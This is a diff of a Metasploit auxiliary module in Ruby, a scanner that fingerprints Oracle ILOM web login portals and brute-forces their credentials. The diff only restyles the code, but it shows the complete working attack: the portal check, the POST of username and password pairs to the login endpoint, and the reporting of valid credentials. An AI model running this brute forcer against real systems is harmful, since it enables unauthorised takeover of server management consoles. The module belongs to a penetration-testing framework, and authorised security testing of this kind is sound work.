@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,38 +7,35 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Oracle ILO Manager Login Brute Force Utility',
-      'Description'    => %{
-        This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and
-        performs a login brute force attack to identify valid credentials.
-      },
-      'Author'         =>
-        [
-          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
-        ],
-      'License'        => MSF_LICENSE,
+                      'Name'           => 'Oracle ILO Manager Login Brute Force Utility',
+                      'Description'    => %{
+                        This module scans for Oracle Integrated Lights Out Manager (ILO) login portal, and
+                        performs a login brute force attack to identify valid credentials.
+                      },
+                      'Author'         =>
+                        [
+                          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+                        ],
+                      'License'        => MSF_LICENSE,
 
-      'DefaultOptions' => { 'SSL' => true }
-  ))
+                      'DefaultOptions' => { 'SSL' => true }))
 
     register_options(
       [
         Opt::RPORT(443)
-      ], self.class)
+      ], self.class
+    )
   end
 
-  def run_host(ip)
-    unless is_app_oilom?
-      return
-    end
+  def run_host(_ip)
+    return unless is_app_oilom?
 
     print_status("Starting login brute force...")
     each_user_pass do |user, pass|
@@ -52,16 +50,15 @@ class MetasploitModule < Msf::Auxiliary
   def is_app_oilom?
     begin
       res = send_request_cgi(
-      {
         'uri'       => '/iPages/i_login.asp',
         'method'    => 'GET'
-      })
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       vprint_error("HTTP Connection Failed...")
       return false
     end
 
-    if (res and res.code == 200 and res.headers['Server'].include?("Oracle-ILOM-Web-Server") and res.body.include?("Integrated Lights Out Manager"))
+    if res && (res.code == 200) && res.headers['Server'].include?("Oracle-ILOM-Web-Server") && res.body.include?("Integrated Lights Out Manager")
       vprint_good("Running Oracle Integrated Lights Out Manager portal...")
       return true
     else
@@ -105,23 +102,22 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
-      {
         'uri'       => '/iPages/loginProcessor.asp',
         'method'    => 'POST',
         'vars_post' =>
-          {
-            'sclink' => '',
-            'username' => user,
-            'password' => pass,
-            'button' => 'Log+In'
-          }
-      })
+    {
+      'sclink' => '',
+      'username' => user,
+      'password' => pass,
+      'button' => 'Log+In'
+    }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       vprint_error("HTTP Connection Failed...")
       return :abort
     end
 
-    if (res and res.code == 200 and res.body.include?("/iPages/suntab.asp") and res.body.include?("SetWebSessionString"))
+    if res && (res.code == 200) && res.body.include?("/iPages/suntab.asp") && res.body.include?("SetWebSessionString")
       print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
       report_cred(
         ip: rhost,
@@ -135,6 +131,5 @@ class MetasploitModule < Msf::Auxiliary
     else
       vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
     end
-
   end
 end
